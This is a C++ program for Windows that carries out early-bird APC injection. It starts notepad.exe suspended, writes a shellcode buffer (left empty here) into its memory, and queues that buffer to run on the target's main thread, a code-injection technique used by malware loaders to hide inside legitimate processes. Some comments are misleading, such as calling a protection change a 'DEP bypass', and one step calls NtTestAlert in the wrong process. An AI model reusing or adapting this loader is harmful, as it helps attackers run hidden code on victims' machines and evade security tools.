#include <windows.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")  // Link NTDLL for NtTestAlert

typedef NTSTATUS(WINAPI* pNtTestAlert)();  // Function prototype for NtTestAlert

int main() {
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";

    // Example shellcode (MessageBox, harmless test)
    unsigned char payload[] = {
        
    };
    SIZE_T payloadSize = sizeof(payload);

    STARTUPINFOA si = { sizeof(si) };  // Use STARTUPINFOA for ANSI compatibility
    PROCESS_INFORMATION pi;

    // Step 1: Create a suspended process
    if (!CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create process. Error: " << GetLastError() << std::endl;
        return -1;
    }

    // Step 2: Allocate executable memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        std::cerr << "Memory allocation failed. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 3: Write payload into allocated memory
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, payload, payloadSize, &written) || written != payloadSize) {
        std::cerr << "Failed to write payload. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 4: Mark memory as executable (DEP bypass)
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Queue the APC call
    if (!QueueUserAPC((PAPCFUNC)remoteMemory, pi.hThread, (ULONG_PTR)NULL)) {  // Cast NULL to ULONG_PTR
        std::cerr << "Failed to queue APC. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 6: Resume thread
    ResumeThread(pi.hThread);

    // Step 7: Force alertable state using NtTestAlert
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll) {
        pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
        if (NtTestAlert) {
            NtTestAlert();
        }
        FreeLibrary(hNtdll);
    }

    std::cout << "APC Injection executed successfully." << std::endl;

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
